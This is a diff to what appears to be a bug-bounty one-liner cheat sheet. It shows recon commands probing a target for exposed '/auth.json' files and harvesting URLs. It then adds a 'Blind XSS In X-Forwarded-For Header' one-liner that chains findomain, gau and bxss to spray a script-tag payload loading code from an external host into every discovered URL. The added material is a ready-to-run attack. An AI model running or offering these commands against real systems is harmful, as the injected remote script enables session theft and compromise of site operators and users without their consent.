@@ -316,3 +316,17 @@ subfinder -d TARGET.COM | httpx -path "/auth.json" -title -status-code -content-
 ```
 xargs -a alive.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# Blind XSS In X-Forwarded-For Header.
+
+## Installation Requirements
+1. BXSS         : https://github.com/ethicalhackingplayground/bxss
+2. GAU          : https://github.com/lc/gau
+3. Findomain    : https://github.com/Findomain/Findomain
+
+## OneLiner
+```
+findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"
+```
